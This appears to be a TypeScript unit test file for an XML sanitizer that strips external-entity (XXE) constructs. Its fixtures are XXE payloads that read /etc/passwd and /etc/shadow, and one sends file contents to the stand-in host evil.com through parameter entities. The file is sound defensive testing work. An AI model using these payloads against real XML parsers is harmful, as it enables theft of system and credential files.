import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { sanitizeXml } from "../../src/lib/xxe-sanitizer.ts";

describe("XML sanitizer", () => {
  it("removes dangerous XXE constructs", () => {
    const xml = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <EntityDescriptor PUBLIC "id" "http://example.com">
        <Name>&xxe;</Name>
      </EntityDescriptor>`;

    const sanitized = sanitizeXml(xml);

    assert.doesNotMatch(sanitized, /<!DOCTYPE/i);
    assert.doesNotMatch(sanitized, /<!ENTITY/i);
    assert.doesNotMatch(sanitized, /SYSTEM/i);
    assert.doesNotMatch(sanitized, /PUBLIC/i);
  });

  it("removes DOCTYPE with nested internal subset brackets", () => {
    const xml = `<!DOCTYPE foo [
      <!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">
      %remote;
    ]>
    <Root><Data>safe</Data></Root>`;

    const sanitized = sanitizeXml(xml);

    assert.doesNotMatch(sanitized, /<!DOCTYPE/i);
    assert.doesNotMatch(sanitized, /<!ENTITY/i);
    assert.match(sanitized, /<Root>/);
    assert.match(sanitized, /safe/);
  });

  it("removes xml-stylesheet processing instructions", () => {
    const xml = `<?xml-stylesheet href="http://evil.com/xxe.xsl" type="text/xsl"?>
    <Root />`;

    const sanitized = sanitizeXml(xml);

    assert.doesNotMatch(sanitized, /xml-stylesheet/i);
    assert.match(sanitized, /<Root \/>/);
  });

  it("removes parameter entity declarations", () => {
    const xml = `<!DOCTYPE foo [
      <!ENTITY % payload SYSTEM "file:///etc/shadow">
      <!ENTITY % wrapper "<!ENTITY &#37; exfil SYSTEM 'http://evil.com/?%payload;'>">
    ]><Root />`;

    const sanitized = sanitizeXml(xml);

    assert.doesNotMatch(sanitized, /<!DOCTYPE/i);
    assert.doesNotMatch(sanitized, /<!ENTITY/i);
  });

  it("preserves safe XML payloads", () => {
    const xml = "<EntityDescriptor><Name>AuthLab</Name></EntityDescriptor>";

    assert.equal(sanitizeXml(xml), xml);
  });

  it("preserves standard XML declaration", () => {
    const xml = `<?xml version="1.0" encoding="UTF-8"?><Root />`;

    const sanitized = sanitizeXml(xml);

    assert.match(sanitized, /\<\?xml version/);
    assert.match(sanitized, /<Root \/>/);
  });
});
